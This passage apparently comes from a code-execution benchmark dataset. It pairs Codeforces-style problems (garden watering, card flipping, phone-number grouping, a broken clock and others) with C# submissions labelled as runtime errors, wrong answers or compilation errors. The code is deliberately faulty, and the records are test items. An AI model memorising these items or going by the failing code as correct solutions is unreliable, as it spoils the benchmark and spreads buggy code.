}\n}\n","description":"Little Petya often travels to his grandmother in the countryside. The grandmother has a large garden, which can be represented as a rectangle 1\u2009\u00d7\u2009n in size, when viewed from above. This rectangle is divided into n equal square sections. The garden is very unusual as each of the square sections possesses its own fixed height and due to the newest irrigation system we can create artificial rain above each section.Creating artificial rain is an expensive operation. That's why we limit ourselves to creating the artificial rain only above one section. At that, the water from each watered section will flow into its neighbouring sections if their height does not exceed the height of the section. That is, for example, the garden can be represented by a 1\u2009\u00d7\u20095 rectangle, where the section heights are equal to 4, 2, 3, 3, 2. Then if we create an artificial rain over any of the sections with the height of 3, the water will flow over all the sections, except the ones with the height of 4. See the illustration of this example at the picture:  As Petya is keen on programming, he decided to find such a section that if we create artificial rain above it, the number of watered sections will be maximal. Help him. ","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a positive integer n (1\u2009\u2264\u2009n\u2009\u2264\u20091000). The second line contains n positive integers which are the height of the sections. All the numbers are no less than 1 and not more than 1000.","output_spec":"Print a single number, the maximal number of watered sections if we create artificial rain above exactly one section.","notes":null,"sample_inputs":["1\n2","5\n1 2 1 2 1","8\n1 2 1 1 1 3 3 4"],"sample_outputs":["1","3","6"]}
{"difficulty":1500,"lang":"MS C#","lang_cluster":"c#","src_uid":"5e055bad1da5bdc84599d6f2f89fbd12","submission_id":"re_1210","tags":["data structures","binary search"],"exec_outcome":"RUNTIME_ERROR","source_code":"using System;\nusing System.Collections.Generic;\nusing System.Collections;\nusing System.Linq;\nusing System.Numerics;\n\n\n\n\nnamespace contest\n{\n\n    class contest\n    {\n\n\n        static void Main(string[] args)\n        {\n\n\n            \/\/int n = int.Parse(Console.ReadLine());\n            \/\/var input = Console.ReadLine().Split().Select(int.Parse).ToArray();\n\n            \/\/var num = Console.ReadLine().Split().Select(int.Parse).ToArray();\n\n\n\n            \/\/int n = int.Parse(Console.ReadLine());\n            \/\/var num = Console.ReadLine().Split().Select(int.Parse).ToArray();\n\n\n            var n = int.Parse(Console.ReadLine());\n            var input = new int[n][];\n\n            var front = new Dictionary<int, int>();\n            var back = new Dictionary<int, int>();\n            var memo = new Dictionary<Tuple<int, int>, int>();\n            for(int i =0; i< n; i++)\n            {\n                input[i] = Console.ReadLine().Split().Select(int.Parse).ToArray();\n                int l = input[i][0];\n                int r = input[i][1];\n\n                if (!front.Keys.Contains(l)) front[l] = 1;\n                else front[l]++;\n\n                if (!back.Keys.Contains(r)) back[r] = 1;\n                else back[r]++;\n\n                if (!memo.Keys.Contains(Tuple.Create(l,r))) memo[Tuple.Create(l,r)]=1;\n                else memo[Tuple.Create(l, r)]++;\n\n            }\n\n            int num = n \/ 2 + n % 2;\n            int turn = int.MaxValue;\n            \n            foreach(var item in front)\n            {\n                if (item.Value >= num)\n                {\n                    turn = 0;\n                    break;\n                }\n                else if(back.Keys.Contains(item.Key))\n                {\n                    int tmp = 0;\n                    if(memo.Keys.Contains(Tuple.Create(item.Key, item.Key)))\n                    {\n                        tmp = memo[Tuple.Create(item.Key, item.Key)];\n                    }\n\n                    if(item.Value + back[item.Key]-tmp >= num)\n                    {\n                        turn = Math.Min(turn , num - item.Value);\n                    }\n                    \n                }\n            }\n\n            foreach (var item in back)\n            {\n                if (item.Value >= num)\n                {\n                    turn = Math.Min(turn, item.Value);\n                   \n                }\n\n                if (front.Keys.Contains(item.Key))\n                {\n                    int tmp = 0;\n                    if (memo.Keys.Contains(Tuple.Create(item.Key, item.Key)))\n                    {\n                        tmp = memo[Tuple.Create(item.Key, item.Key)];\n                    }\n\n                    if (item.Value + front[item.Key] - tmp >= num)\n                    {\n                        turn = Math.Min(turn, item.Value-tmp);\n                    }\n\n                }\n            }\n\n\n            if (turn == int.MaxValue) turn = -1;\n            \n            Console.WriteLine(turn);\n           \n\n\n\n        }\n\n        \n\n    }\n\n\n   \n    \n}\n","description":"The Little Elephant loves to play with color cards.He has n cards, each has exactly two colors (the color of the front side and the color of the back side). Initially, all the cards lay on the table with the front side up. In one move the Little Elephant can turn any card to the other side. The Little Elephant thinks that a set of cards on the table is funny if at least half of the cards have the same color (for each card the color of the upper side is considered).Help the Little Elephant to find the minimum number of moves needed to make the set of n cards funny.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a single integer n (1\u2009\u2264\u2009n\u2009\u2264\u2009105) \u2014 the number of the cards. The following n lines contain the description of all cards, one card per line. The cards are described by a pair of positive integers not exceeding 109 \u2014 colors of both sides. The first number in a line is the color of the front of the card, the second one \u2014 of the back. The color of the front of the card may coincide with the color of the back of the card. The numbers in the lines are separated by single spaces.","output_spec":"On a single line print a single integer \u2014 the sought minimum number of moves. If it is impossible to make the set funny, print -1.","notes":"NoteIn the first sample there initially are three cards lying with colors 4, 4, 7. Since two of the three cards are of the same color 4, you do not need to change anything, so the answer is 0.In the second sample, you can turn the first and the fourth cards. After that three of the five cards will be of color 7.","sample_inputs":["3\n4 7\n4 7\n7 4","5\n4 7\n7 4\n2 11\n9 7\n1 1"],"sample_outputs":["0","2"]}
{"difficulty":1100,"lang":"Mono C#","lang_cluster":"c#","src_uid":"65fea461d3caa5a932d1e2c13e99a59e","submission_id":"re_1287","tags":["math"],"exec_outcome":"RUNTIME_ERROR","source_code":"using System;\nusing System.Globalization;\nnamespace eolimp\n{\n   class Program\n   {\n       public static void Main (string[] args)\n       {\t\n\t\t\tSystem.Threading.Thread.CurrentThread.CurrentCulture = new CultureInfo(\"en-US\");\n\t\t\tstring []s = Console.ReadLine().Split(' ');\n\t\t\t\n\t\t\tint n = int.Parse(s[0]), b = int.Parse(s[1]),m=0;\n\t\t\ts = Console.ReadLine().Split(' ');\n\t\t\tint [] a = new int [n];\n\t\t\tdouble [] c = new double [n];\n\t\t\tfor(int i=0;i<n;++i) \n\t\t\t{\n\t\t\t\ta[i] = int.Parse(s[i]);\n\t\t\t\tm = Math.Max(a[i],m);\n\t\t\t}\n       \t\t\n\t\t\tfor(int i=0;i<n;++i)\n\t\t\t{\n\t\t\t\tint x = m-a[i];\n\t\t\t\tif (b<x) {Console.WriteLine(-1); return ;}\n\t\t\t\tc[i] = x;\n\t\t\t\tb-=x;\n\t\t\t}\n\t\t\tfor(int i=0;i<n;++i)\n\t\t\t{\n\t\t\t\t\t\tConsole.WriteLine((c[i]+1.0*b\/n).ToString());\n\t\t\t}\n       }\n   }\n}","description":"A group of n merry programmers celebrate Robert Floyd's birthday. Polucarpus has got an honourable task of pouring Ber-Cola to everybody. Pouring the same amount of Ber-Cola to everybody is really important. In other words, the drink's volume in each of the n mugs must be the same.Polycarpus has already began the process and he partially emptied the Ber-Cola bottle. Now the first mug has a1 milliliters of the drink, the second one has a2 milliliters and so on. The bottle has b milliliters left and Polycarpus plans to pour them into the mugs so that the main equation was fulfilled.Write a program that would determine what volume of the drink Polycarpus needs to add into each mug to ensure that the following two conditions were fulfilled simultaneously:   there were b milliliters poured in total. That is, the bottle need to be emptied;  after the process is over, the volumes of the drink in the mugs should be equal. ","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a pair of integers n, b (2\u2009\u2264\u2009n\u2009\u2264\u2009100,\u20091\u2009\u2264\u2009b\u2009\u2264\u2009100), where n is the total number of friends in the group and b is the current volume of drink in the bottle. The second line contains a sequence of integers a1,\u2009a2,\u2009...,\u2009an (0\u2009\u2264\u2009ai\u2009\u2264\u2009100), where ai is the current volume of drink in the i-th mug.","output_spec":"Print a single number \"-1\" (without the quotes), if there is no solution. Otherwise, print n float numbers c1,\u2009c2,\u2009...,\u2009cn, where ci is the volume of the drink to add in the i-th mug. Print the numbers with no less than 6 digits after the decimal point, print each ci on a single line. Polycarpus proved that if a solution exists then it is unique. Russian locale is installed by default on the testing computer. Make sure that your solution use the point to separate the integer part of a real number from the decimal, not a comma.","notes":null,"sample_inputs":["5 50\n1 2 3 4 5","2 2\n1 100"],"sample_outputs":["12.000000\n11.000000\n10.000000\n9.000000\n8.000000","-1"]}
{"difficulty":800,"lang":"MS C#","lang_cluster":"c#","src_uid":"69850c2af99d60711bcff5870575e15e","submission_id":"re_1344","tags":["implementation"],"exec_outcome":"RUNTIME_ERROR","source_code":"\ufeffusing System;\nusing System.Collections.Generic;\nusing System.Linq;\nusing System.Text;\nusing System.Threading.Tasks;\n\nnamespace _38A\n{\n    class Program\n    {\n        static void Main(string[] args)\n        {\n            int n = Convert.ToInt32(Console.ReadLine());\n\n            string[] d = Console.ReadLine().Split();\n            string[] str = Console.ReadLine().Split();\n\n            int a = Convert.ToInt32(str[0]);\n            int b = Convert.ToInt32(str[1]);\n\n            int total = 0;\n\n            for (int i = a; i <= b; ++i)\n            {\n                total += Convert.ToInt32(d[i - 1]);\n            }\n\n            Console.WriteLine(total);\n        }\n    }\n}\n","description":"The Berland Armed Forces System consists of n ranks that are numbered using natural numbers from 1 to n, where 1 is the lowest rank and n is the highest rank.One needs exactly di years to rise from rank i to rank i\u2009+\u20091. Reaching a certain rank i having not reached all the previous i\u2009-\u20091 ranks is impossible.Vasya has just reached a new rank of a, but he dreams of holding the rank of b. Find for how many more years Vasya should serve in the army until he can finally realize his dream.","input_from":"standard input","output_to":"standard output","input_spec":"The first input line contains an integer n (2\u2009\u2264\u2009n\u2009\u2264\u2009100). The second line contains n\u2009-\u20091 integers di (1\u2009\u2264\u2009di\u2009\u2264\u2009100). The third input line contains two integers a and b (1\u2009\u2264\u2009a\u2009&lt;\u2009b\u2009\u2264\u2009n). The numbers on the lines are space-separated.","output_spec":"Print the single number which is the number of years that Vasya needs to rise from rank a to rank b.","notes":null,"sample_inputs":["3\n5 6\n1 2","3\n5 6\n1 3"],"sample_outputs":["5","11"]}
{"difficulty":1000,"lang":"MS C#","lang_cluster":"c#","src_uid":"6e0dafeaf85e92f959c388c72e158f68","submission_id":"re_409","tags":["constructive algorithms","*special"],"exec_outcome":"RUNTIME_ERROR","source_code":"using System;\n\nnamespace ConsoleApplication1\n{\n    class Program\n    {\n        static void Main(string[] args)\n        {\n            int n = Int32.Parse(Console.In.ReadLine());\n            int a = Int32.Parse(Console.In.ReadLine());\n            int b = Int32.Parse(Console.In.ReadLine());\n            \n            if ((a * b < n) ||\n                ((a < 1) && (a > 100)) ||\n                ((b < 1) && (b > 100)) ||\n                ((n < 1) && (n > 10000)))\n            {\n                Console.Out.WriteLine(\"-1\");\n                Environment.Exit(0);\n            }\n\n            int man = 1;\n            for (int row = 0; row < a; row++)\n            {\n                if ((b % 2 == 0) && (row % 2 == 1))\n                {\n                    man += (b - 1);\n                    for (int col = b - 1; col >= 0; col--)\n                    {\n                        if (man <= n)\n                            Console.Out.Write(man.ToString() + \" \");\n                        else\n                            Console.Out.Write(\"0 \");\n                        man--;\n                    }\n                    man += (b + 1);\n                }\n                else\n                {\n                    for (int col = 0; col < b; col++)\n                    {\n                        if (man <= n)\n                            Console.Out.Write(man.ToString() + \" \");\n                        else\n                            Console.Out.Write(\"0 \");\n                        man++;\n                    }\n                }\n                Console.Out.WriteLine(\"\");\n            }\n        }\n    }\n}\n","description":"There are n parliamentarians in Berland. They are numbered with integers from 1 to n. It happened that all parliamentarians with odd indices are Democrats and all parliamentarians with even indices are Republicans.New parliament assembly hall is a rectangle consisting of a\u2009\u00d7\u2009b chairs\u00a0\u2014 a rows of b chairs each. Two chairs are considered neighbouring if they share as side. For example, chair number 5 in row number 2 is neighbouring to chairs number 4 and 6 in this row and chairs with number 5 in rows 1 and 3. Thus, chairs have four neighbours in general, except for the chairs on the border of the hallWe know that if two parliamentarians from one political party (that is two Democrats or two Republicans) seat nearby they spent all time discussing internal party issues.Write the program that given the number of parliamentarians and the sizes of the hall determine if there is a way to find a seat for any parliamentarian, such that no two members of the same party share neighbouring seats.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input contains three integers n, a and b (1\u2009\u2264\u2009n\u2009\u2264\u200910\u2009000, 1\u2009\u2264\u2009a,\u2009b\u2009\u2264\u2009100)\u00a0\u2014 the number of parliamentarians, the number of rows in the assembly hall and the number of seats in each row, respectively.","output_spec":"If there is no way to assigns seats to parliamentarians in a proper way print -1. Otherwise print the solution in a lines, each containing b integers. The j-th integer of the i-th line should be equal to the index of parliamentarian occupying this seat, or 0 if this seat should remain empty. If there are multiple possible solution, you may print any of them.","notes":"NoteIn the first sample there are many other possible solutions. For example, 3 20 1and 2 13 0The following assignment 3 21 0is incorrect, because parliamentarians 1 and 3 are both from Democrats party but will occupy neighbouring seats.","sample_inputs":["3 2 2","8 4 3","10 2 2"],"sample_outputs":["0 3\n1 2","7 8 3\n0 1 4\n6 0 5\n0 2 0","-1"]}
{"difficulty":1100,"lang":"Mono C#","lang_cluster":"c#","src_uid":"6f6859aabc1c9cbb9ee0d910064d87c2","submission_id":"re_844","tags":["implementation"],"exec_outcome":"RUNTIME_ERROR","source_code":"using System;\nclass Program\n    {\n        static void Main(string[] args)\n        {\n            string input = Console.In.ReadToEnd().Split(new char[] { '\\n', '\\r' }, StringSplitOptions.RemoveEmptyEntries)[1];\n            char[] result;\n            int i,j;\n            switch(input.Length%3)\n            {\n                case 1:\n                    result = new char[input.Length + input.Length \/ 3 + 1];\n                    result[2] = '-';\n                    result[0] = input[0];\n                    result[1] = input[1];\n                    result[5] = '-';\n                    result[3] = input[2];\n                    result[4] = input[3];\n                    i = 6;\n                    j = 4;\n                    break;\n                case 2:\n                    result = new char[input.Length \/ 3 + input.Length + 1];\n                    result[2] = '-';\n                    result[0] = input[0];\n                    result[1] = input[1];\n                    i = 3;\n                    j = 2;\n                    break;\n                default:\n                    result = new char[input.Length \/ 3 + input.Length];\n                    j = i = 0;\n                    break;\n            }\n            for(;i<input.Length;)\n            {\n                result[i++] = input[j++];\n                result[i++] = input[j++];\n                result[i++] = input[j++];\n                result[i++] = '-';\n            }\n            result[result.Length - 1] = '\\n';\n            Console.Write(new string(result));\n        }\n    }","description":"Phone number in Berland is a sequence of n digits. Often, to make it easier to memorize the number, it is divided into groups of two or three digits. For example, the phone number 1198733 is easier to remember as 11-987-33. Your task is to find for a given phone number any of its divisions into groups of two or three digits.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains integer n (2\u2009\u2264\u2009n\u2009\u2264\u2009100) \u2014 amount of digits in the phone number. The second line contains n digits \u2014 the phone number to divide into groups.","output_spec":"Output any of divisions of the given phone number into groups of two or three digits. Separate groups by single character -. If the answer is not unique, output any.","notes":null,"sample_inputs":["6\n549871","7\n1198733"],"sample_outputs":["54-98-71","11-987-33"]}
{"difficulty":800,"lang":"MS C#","lang_cluster":"c#","src_uid":"7170c40405cf7a5e0f2bd15e4c7d189d","submission_id":"re_1147","tags":["implementation","brute force"],"exec_outcome":"WRONG_ANSWER","source_code":"using System;\n\nclass Program {\n  static void Main() {\n    var n = int.Parse(Console.ReadLine());\n    var cur = 0;\n    var add = 1;\n    for (var i = 1; i < n ; i++) {\n      Console.Write(\"{0} \", cur + 1);\n      cur = (cur + add)%n;\n      add++;\n    }\n  }\n}","description":"A kindergarten teacher Natalia Pavlovna has invented a new ball game. This game not only develops the children's physique, but also teaches them how to count. The game goes as follows. Kids stand in circle. Let's agree to think of the children as numbered with numbers from 1 to n clockwise and the child number 1 is holding the ball. First the first child throws the ball to the next one clockwise, i.e. to the child number 2. Then the child number 2 throws the ball to the next but one child, i.e. to the child number 4, then the fourth child throws the ball to the child that stands two children away from him, i.e. to the child number 7, then the ball is thrown to the child who stands 3 children away from the child number 7, then the ball is thrown to the child who stands 4 children away from the last one, and so on. It should be mentioned that when a ball is thrown it may pass the beginning of the circle. For example, if n\u2009=\u20095, then after the third throw the child number 2 has the ball again. Overall, n\u2009-\u20091 throws are made, and the game ends.The problem is that not all the children get the ball during the game. If a child doesn't get the ball, he gets very upset and cries until Natalia Pavlovna gives him a candy. That's why Natalia Pavlovna asks you to help her to identify the numbers of the children who will get the ball after each throw.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains integer n (2\u2009\u2264\u2009n\u2009\u2264\u2009100) which indicates the number of kids in the circle.","output_spec":"In the single line print n\u2009-\u20091 numbers which are the numbers of children who will get the ball after each throw. Separate the numbers by spaces.","notes":null,"sample_inputs":["10","3"],"sample_outputs":["2 4 7 1 6 2 9 7 6","2 1"]}
{"difficulty":1300,"lang":"MS C#","lang_cluster":"c#","src_uid":"782b819eb0bfc86d6f96f15ac09d5085","submission_id":"re_1554","tags":["math"],"exec_outcome":"COMPILATION_ERROR","source_code":"\ufeffusing System;\nusing System.Numerics;\nclass Program\n{\n    static void Main()\n    {\n        const long mod = 1000000007;\n        var n = long.Parse(Console.ReadLine());\n        Console.WriteLine(BigInteger.Remainder(BigInteger.ModPow(2, n - 1, mod) * (1 + BigInteger.ModPow(2, n, mod)), mod));\n    }\n}","description":"Dwarfs have planted a very interesting plant, which is a triangle directed \"upwards\". This plant has an amusing feature. After one year a triangle plant directed \"upwards\" divides into four triangle plants: three of them will point \"upwards\" and one will point \"downwards\". After another year, each triangle plant divides into four triangle plants: three of them will be directed in the same direction as the parent plant, and one of them will be directed in the opposite direction. Then each year the process repeats. The figure below illustrates this process.  Help the dwarfs find out how many triangle plants that point \"upwards\" will be in n years.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a single integer n (0\u2009\u2264\u2009n\u2009\u2264\u20091018) \u2014 the number of full years when the plant grew. Please do not use the %lld specifier to read or write 64-bit integers in \u0421++. It is preferred to use cin, cout streams or the %I64d specifier.","output_spec":"Print a single integer \u2014 the remainder of dividing the number of plants that will point \"upwards\" in n years by 1000000007 (109\u2009+\u20097).","notes":"NoteThe first test sample corresponds to the second triangle on the figure in the statement. The second test sample corresponds to the third one.","sample_inputs":["1","2"],"sample_outputs":["3","10"]}
{"difficulty":1300,"lang":"MS C#","lang_cluster":"c#","src_uid":"88d56c1e3a7ffa94354ce0c70d8e958f","submission_id":"re_1169","tags":["implementation","brute force"],"exec_outcome":"RUNTIME_ERROR","source_code":"    using System;\n    using System.Collections.Generic;\n    using System.Globalization;\n    using System.IO;\n    using System.Linq;\n    using System.Runtime.CompilerServices;\n    using System.Runtime.InteropServices;\n    using System.Threading;\n\n    namespace Codeforces\n    {\n        class Program : IDisposable\n        {\n            private static readonly TextReader textReader = new StreamReader(Console.OpenStandardInput());\n            private static readonly TextWriter textWriter = new StreamWriter(Console.OpenStandardOutput());\n\n\n            private void Solve()\n            {\n                var n = int.Parse(Console.ReadLine());\n                var s = Console.ReadLine().Split(':');\n                var hh = int.Parse(s[0]);\n                string sHH = s[0], sMM = s[1];\n                var mm = int.Parse(s[1]);\n                if (n == 12)\n                {\n                    if (hh < 1 || hh > 12)\n                    {\n                        sHH = string.Format(\"{0}{1}\",0,hh.ToString()[1]);\n                    }\n                }\n                else\n                {\n                    if (hh < 1 || hh > 23)\n                    {\n                        sHH = string.Format(\"{0}{1}\", 0, hh.ToString()[1]);\n                    }\n                }\n\n                if (mm < 1 || mm > 59)\n                {\n                    sMM = string.Format(\"{0}{1}\", 1, mm.ToString()[1]);\n                }\n                Console.WriteLine(\"{0}:{1}\",sHH, sMM);\n            }\n\n            static void Main(string[] args)\n            {\n                var p = new Program();\n                p.Solve();\n                \/\/Console.ReadLine();\n                p.Dispose();\n            }\n\n            #region Helpers\n\n            private static int ReadInt()\n            {\n                return int.Parse(textReader.ReadLine());\n            }\n\n            private static long ReadLong()\n            {\n                return long.Parse(textReader.ReadLine());\n            }\n\n            private static int[] ReadIntArray()\n            {\n                return textReader.ReadLine().Split(' ').Select(int.Parse).ToArray();\n            }\n            #endregion\n\n            public void Dispose()\n            {\n                textReader.Close();\n                textWriter.Close();\n            }\n        }\n    }\n","description":"You are given a broken clock. You know, that it is supposed to show time in 12- or 24-hours HH:MM format. In 12-hours format hours change from 1 to 12, while in 24-hours it changes from 0 to 23. In both formats minutes change from 0 to 59.You are given a time in format HH:MM that is currently displayed on the broken clock. Your goal is to change minimum number of digits in order to make clocks display the correct time in the given format.For example, if 00:99 is displayed, it is enough to replace the second 9 with 3 in order to get 00:39 that is a correct time in 24-hours format. However, to make 00:99 correct in 12-hours format, one has to change at least two digits. Additionally to the first change one can replace the second 0 with 1 and obtain 01:39.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input contains one integer 12 or 24, that denote 12-hours or 24-hours format respectively. The second line contains the time in format HH:MM, that is currently displayed on the clock. First two characters stand for the hours, while next two show the minutes.","output_spec":"The only line of the output should contain the time in format HH:MM that is a correct time in the given format. It should differ from the original in as few positions as possible. If there are many optimal solutions you can print any of them.","notes":null,"sample_inputs":["24\n17:30","12\n17:30","24\n99:99"],"sample_outputs":["17:30","07:30","09:09"]}
{"difficulty":1400,"lang":"Mono C#","lang_cluster":"c#","src_uid":"8a9adc116abbd387a6a64dd754436f8a","submission_id":"re_454","tags":["brute force","math"],"exec_outcome":"RUNTIME_ERROR","source_code":"using System;\nusing System.Collections.Generic;\nusing System.Linq;\nusing System.Text;\n\nnamespace ProgrammingContest.Codeforces.Round30\n{\n    class A\n    {\n        static long pow(long x, long n)\n        {\n            checked\n            {\n                long res = 1;\n                for (int i = 0; i < n; i++) res *= x;\n                return res;\n            }\n        }\n\n        public static void Main()\n        {\n            checked\n            {\n                long[] xs = Console.ReadLine().Split(' ').Select(s => long.Parse(s)).ToArray();\n                long A = xs[0],\n                     B = xs[1],\n                     n = xs[2];\n                A = Math.Abs(A);\n                B = Math.Abs(B);\n                for (long x = 0; x < 1000 && A * pow(x, n) <= B; x++)\n                    if (A * (int)Math.Pow(x, n) == B)\n                    {\n                        if (xs[0] < 0 && xs[1] > 0 || xs[0] > 0 && xs[1] < 0)\n                            x = -x;\n                        Console.WriteLine(x);\n                        return;\n                    }\n            }\n            Console.WriteLine(\"No solution\");\n        }\n    }\n}\n","description":"A long time ago in some far country lived king Copa. After the recent king's reform, he got so large powers that started to keep the books by himself.The total income A of his kingdom during 0-th year is known, as well as the total income B during n-th year (these numbers can be negative \u2014 it means that there was a loss in the correspondent year). King wants to show financial stability. To do this, he needs to find common coefficient X \u2014 the coefficient of income growth during one year. This coefficient should satisfy the equation:A\u00b7Xn\u2009=\u2009B.Surely, the king is not going to do this job by himself, and demands you to find such number X.It is necessary to point out that the fractional numbers are not used in kingdom's economy. That's why all input numbers as well as coefficient X must be integers. The number X may be zero or negative.","input_from":"standard input","output_to":"standard output","input_spec":"The input contains three integers A, B, n (|A|,\u2009|B|\u2009\u2264\u20091000, 1\u2009\u2264\u2009n\u2009\u2264\u200910).","output_spec":"Output the required integer coefficient X, or \u00abNo solution\u00bb, if such a coefficient does not exist or it is fractional. If there are several possible solutions, output any of them.","notes":null,"sample_inputs":["2 18 2","-1 8 3","0 0 10","1 16 5"],"sample_outputs":["3","-2","5","No solution"]}
{"difficulty":1400,"lang":"Mono C#","lang_cluster":"c#","src_uid":"991516fa6f3ed5a71c547a3a50ea1a2b","submission_id":"re_1049","tags":["brute force"],"exec_outcome":"RUNTIME_ERROR","source_code":"\ufeff\/\/#undef DEBUG\n\nusing System;\nusing System.Collections.Generic;\nusing System.Text;\nusing System.Diagnostics;\n\nnamespace codeforces\n{\n    class C\n    {\n        \/\/  test\n        static CodeforcesUtils CF = new CodeforcesUtils(\n@\"\n2 3\n1 2\n\");\n\n        class Solver\n        {\n            public void Solve()\n            {\n                string[] ss = CF.ReadLine().Split(' ');\n                int n = int.Parse(ss[0]);\n                int l = int.Parse(ss[1]);\n\n                List<int> ai = new List<int>();\n                ss = CF.ReadLine().Split(' ');\n                foreach (string s in ss)\n                    ai.Add(int.Parse(s));\n\n                int c  = 0;\n                foreach(int a in ai )\n                {\n                    c += (a\/l);\n                }\n\n                CF.WriteLine(c*l);\n\n            }\n\n            int[,] b;\n\n            void bs(int x, int y)\n            {\n                if (x < 1 || x > 8)\n                    return;\n                if (y < 1 || y > 8)\n                    return;\n                b[x, y] = 1;\n            }\n        }\n            \n        \n        #region test\n\n        static void Main(string[] args)\n        {\n            System.Threading.Thread.CurrentThread.CurrentCulture = new System.Globalization.CultureInfo(\"ru-RU\");\n\n            new Solver().Solve();\n            CF.Close();\n        }\n\n        static void TLE()\n        {\n            for (; ; ) ;\n        }\n\n        class CodeforcesUtils\n        {\n            public string ReadLine()\n            {\n#if DEBUG\n                if (_lines == null)\n                {\n                    _lines = new List<string>();\n                    string[] ss = _test_input.Replace(\"\\n\", \"\").Split('\\r');\n                    for (int i = 0; i < ss.Length; i++)\n                    {\n                        if (\n                            (i == 0 || i == ss.Length - 1) &&\n                            ss[i].Length == 0\n                            )\n                            continue;\n\n                        _lines.Add(ss[i]);\n                    }\n                }\n\n                string s = null;\n                if (_lines.Count > 0)\n                {\n                    s = _lines[0];\n                    _lines.RemoveAt(0);\n                }\n                return s;\n\n#else\n                \/\/return _sr.ReadLine();\n            return Console.In.ReadLine();\n#endif\n            }\n\n            public void WriteLine(object o)\n            {\n#if DEBUG\n                System.Diagnostics.Trace.WriteLine(o);\n#else\n                \/\/_sw.WriteLine(o);\n            Console.WriteLine(o);\n#endif\n            }\n\n            public void Write(object o)\n            {\n#if DEBUG\n                System.Diagnostics.Trace.Write(o);\n#else\n                 \/\/_sw.Write(o);\n           Console.Write(o);\n#endif\n            }\n\n\n            string _test_input;\n\n            List<string> _lines;\n\n#if DEBUG\n            public CodeforcesUtils(string test_input)\n            {\n                _test_input = test_input;\n            }\n#else\n\n            public CodeforcesUtils(string dummy)\n            {\n                \/\/_sr = new System.IO.StreamReader(\"input.txt\");\n                \/\/_sw = new System.IO.StreamWriter(\"output.txt\");\n            }\n#endif\n\n            public void Close()\n            {\n                if( _sr!= null)\n                    _sr.Close();\n                if( _sw != null)\n                    _sw.Close();\n            }\n\n            System.IO.StreamReader _sr=null;\n            System.IO.StreamWriter _sw=null;\n          \n        }\n\n        #endregion\n    }\n}\n","description":"The blinds are known to consist of opaque horizontal stripes that can be rotated thus regulating the amount of light flowing in the room. There are n blind stripes with the width of 1 in the factory warehouse for blind production. The problem is that all of them are spare details from different orders, that is, they may not have the same length (it is even possible for them to have different lengths)Every stripe can be cut into two or more parts. The cuttings are made perpendicularly to the side along which the length is measured. Thus the cuttings do not change the width of a stripe but each of the resulting pieces has a lesser length (the sum of which is equal to the length of the initial stripe)After all the cuttings the blinds are constructed through consecutive joining of several parts, similar in length, along sides, along which length is measured. Also, apart from the resulting pieces an initial stripe can be used as a blind if it hasn't been cut. It is forbidden to construct blinds in any other way.Thus, if the blinds consist of k pieces each d in length, then they are of form of a rectangle of k\u2009\u00d7\u2009d bourlemeters. Your task is to find for what window possessing the largest possible area the blinds can be made from the given stripes if on technical grounds it is forbidden to use pieces shorter than l bourlemeter. The window is of form of a rectangle with side lengths as positive integers.","input_from":"standard input","output_to":"standard output","input_spec":"The first output line contains two space-separated integers n and l (1\u2009\u2264\u2009n,\u2009l\u2009\u2264\u2009100). They are the number of stripes in the warehouse and the minimal acceptable length of a blind stripe in bourlemeters. The second line contains space-separated n integers ai. They are the lengths of initial stripes in bourlemeters (1\u2009\u2264\u2009ai\u2009\u2264\u2009100).","output_spec":"Print the single number \u2014 the maximal area of the window in square bourlemeters that can be completely covered. If no window with a positive area that can be covered completely without breaking any of the given rules exist, then print the single number 0.","notes":"NoteIn the first sample test the required window is 2\u2009\u00d7\u20094 in size and the blinds for it consist of 4 parts, each 2 bourlemeters long. One of the parts is the initial stripe with the length of 2, the other one is a part of a cut stripe with the length of 3 and the two remaining stripes are parts of a stripe with the length of 4 cut in halves.","sample_inputs":["4 2\n1 2 3 4","5 3\n5 5 7 3 1","2 3\n1 2"],"sample_outputs":["8","15","0"]}
{"difficulty":1400,"lang":"Mono C#","lang_cluster":"c#","src_uid":"9c30697e71102ae10c55c14d9c1db006","submission_id":"re_1339","tags":["dp","implementation","greedy"],"exec_outcome":"WRONG_ANSWER","source_code":"\ufeffusing System;\nusing System.Collections.Generic;\nusing System.Linq;\nusing System.Text;\n\nnamespace olymp\n{\n    class Program\n    {\n        static void Main(string[] args)\n        {\n            string[] s = Console.ReadLine().Split('.');\n            if (s.Length < 2)\n            {\n                Console.WriteLine(\"NO\");\n                return;\n            }\n            bool check = false;\n            for (int i = 0; i < s.Length; i++)\n            {\n                if (i == 0 && (s[i].Length > 8 || s[i].Length == 0)) check = true;\n                else if (i == s.Length - 1 && (s[i].Length > 3 || s[i].Length == 0)) check = true;\n                else if (i != 0 && i != s.Length - 1 && (s[i].Length > 11 || s[i].Length == 0)) check = true;\n            }\n            if (check)\n            {\n                Console.WriteLine(\"NO\");\n            }\n            else\n            {\n                Console.WriteLine(\"YES\");\n                string tmp = s[0] + '.';\n                for (int i = 1; i < s.Length - 1; i++)\n                {\n                    if (s[i].Length < 4)\n                    {\n                        tmp += s[i].Substring(0, 1);\n                        Console.WriteLine(tmp);\n                        tmp = s[i].Substring(1, s[i].Length - 1) + '.';\n                    }\n                    else\n                    {\n                        tmp += s[i].Substring(0, 3);\n                        Console.WriteLine(tmp);\n                        tmp = s[i].Substring(3, s[i].Length - 3) + '.';\n                    }\n                }\n                tmp += s[s.Length - 1];\n                Console.WriteLine(tmp);\n            }\n        }\n    }\n}\n","description":"Eudokimus, a system administrator is in trouble again. As a result of an error in some script, a list of names of very important files has been damaged. Since they were files in the BerFS file system, it is known that each file name has a form \"name.ext\", where:   name is a string consisting of lowercase Latin letters, its length is from 1 to 8 characters;  ext is a string consisting of lowercase Latin letters, its length is from 1 to 3 characters. For example, \"read.me\", \"example.txt\" and \"b.cpp\" are valid file names and \"version.info\", \"ntldr\" and \"contestdata.zip\" are not.Damage to the list meant that all the file names were recorded one after another, without any separators. So now Eudokimus has a single string.Eudokimus needs to set everything right as soon as possible. He should divide the resulting string into parts so that each part would be a valid file name in BerFS. Since Eudokimus has already proved that he is not good at programming, help him. The resulting file list can contain the same file names.","input_from":"standard input","output_to":"standard output","input_spec":"The input data consists of a single string s, its length is from 1 to 